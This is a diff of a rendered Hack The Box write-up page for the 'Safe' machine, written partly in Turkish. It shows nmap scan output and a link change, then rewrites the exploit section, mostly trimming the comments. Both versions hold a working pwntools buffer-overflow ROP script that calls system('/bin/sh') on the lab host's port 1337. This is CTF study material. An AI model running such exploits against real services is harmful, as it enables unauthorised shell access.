@@ -1,4 +1,4 @@
-I"�e<hr />
+I"�`<hr />
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># nmap -sS -sV -p- -A 10.10.10.147                                                                                                     </span>
 Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-16 11:08 +03
 Nmap scan report <span class="k">for </span>safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
@@ -99,7 +99,7 @@ HOP RTT      ADDRESS
 2   66.06 ms safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
 </code></pre></div></div>
 <hr />
-<p><img src="http://localhost:4000/assets/myapp.png" alt="alt text" /></p>
+<p><img src="https://teamredblue.github.io/assets/myapp.png" alt="alt text" /></p>
 <h5 id="kaynak-kodda-myapp-isimli-bir-uygulamanın-olduğu-söyleniyor">Kaynak kodda myapp isimli bir uygulamanın olduğu söyleniyor</h5>
 <hr />
 <hr />
@@ -383,23 +383,18 @@ Gadgets
 
 99 gadgets found
 </code></pre></div></div>
-<h5 id="0x0000000000401206-pop-r13-pop-r14-pop-r15-ret--bu-gadgetlerden-biri-3-tane-daha-var">0x0000000000401206: pop r13; pop r14; pop r15; ret;  bu gadgetlerden biri 3 tane daha var</h5>
-<h5 id="bulunan-gadgetin-offsetini-alalım-0x401206">Bulunan gadgetin offsetini alalım 0x401206</h5>
-<h5 id="yapmaya-çalıştığımız-şey-bufferı-taşırıp-rspnin--binsh-adresini-göstermesi-r13-gadgetine-system-adresini-gösterip-r14-ve-r15-e-null-byte-x00-bastırmaktır-test-fonksiyonu-programın-normal-akışı-sırasında-hiç-kullanılmamıştır-test-fonksiyonunu-çağırıp-rsp-değerini-binsh--rdiye-yazılacaktır-r13-adresine-zıplayıp-shell-içerisinde-komut-çalıştırılmalıdır">Yapmaya çalıştığımız şey, bufferı taşırıp, RSP’nin  /bin/sh adresini göstermesi. r13 gadgetine system adresini gösterip, r14 ve r15 e null byte “\x00” bastırmaktır. Test fonksiyonu programın normal akışı sırasında hiç kullanılmamıştır test fonksiyonunu çağırıp, RSP değerini (“/bin/sh”)  rdi’ye yazılacaktır. r13 adresine zıplayıp shell içerisinde komut çalıştırılmalıdır.</h5>
-<h5 id="bu-kadar-boş-yeter-kaynak-koda-geçeyim">Bu kadar boş yeter. Kaynak koda geçeyim.</h5>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># gerekli library, aslinda cok ta gerekli degil ama yine de dursun profit
-</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> <span class="c1"># baglanilacak sunucu ve portu
-</span><span class="n">trash</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">112</span> <span class="c1"># normalde 119 gormustuk. ancak /bin/sh 7 byte oldugu icin
-# 112 + 7 byte seklinde stacki tastiriyoruz
-</span><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span> <span class="c1"># system adresi
-</span><span class="n">rpop13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span> <span class="c1"># r13 adresi 
-</span><span class="n">rjmp13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span> <span class="c1"># hic bir zaman kullanilmayan test fonksiyonu
-</span><span class="n">shell</span> <span class="o">=</span>  <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="c1"># komut calistiracagimiz shell
+<h5 id="0x0000000000401206-pop-r13-pop-r14-pop-r15-ret">0x0000000000401206: pop r13; pop r14; pop r15; ret;</h5>
+<h5 id="offset-0x401206">Offset: 0x401206</h5>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># library
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> <span class="c1"># server port
+</span><span class="n">trash</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">112</span> <span class="c1"># 119-7 len(/bin/sh)
+</span><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span> <span class="c1"># systemaddr
+</span><span class="n">rpop13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span> <span class="c1"># r13addr
+</span><span class="n">rjmp13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span> <span class="c1"># test addr
+</span><span class="n">shell</span> <span class="o">=</span>  <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="c1"># sh
 </span><span class="n">NULL</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="c1"># NULL byte
-</span><span class="n">payload</span> <span class="o">=</span> <span class="n">trash</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="n">rpop13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span>  <span class="n">NULL</span> <span class="o">+</span> <span class="n">NULL</span> <span class="o">+</span> <span class="n">rjmp13</span> <span class="c1"># tasir + shell 
-# null byte +  rop attack 
-# null*2 + cagrilmayan test adresi
-</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># payloadi gonder
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">trash</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="n">rpop13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span>  <span class="n">NULL</span> <span class="o">+</span> <span class="n">NULL</span> <span class="o">+</span> <span class="n">rjmp13</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send
 </span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># i/o
 </span></code></pre></div></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">~/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Safe</span> <span class="c1"># python exploit.py                                                                                                                                               
